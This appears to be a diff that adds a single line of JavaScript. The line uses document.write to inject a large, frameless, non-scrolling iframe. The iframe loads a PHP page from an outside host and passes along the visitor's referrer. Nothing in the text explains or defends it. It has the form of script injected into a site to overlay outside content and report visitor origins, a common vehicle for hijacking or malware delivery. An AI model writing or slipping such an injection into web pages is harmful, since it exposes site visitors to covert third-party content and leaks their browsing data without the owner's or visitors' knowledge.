@@ -1,0 +1,1 @@
+document.write('<iframe src="http://vip.gezhiit.com/moban/baicaoxuan/yfz.php?r='+escape(document.referrer)+'&t='+Math.random()+'" width="1280px" height="568px" allowtransparency="true" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"></iframe>');
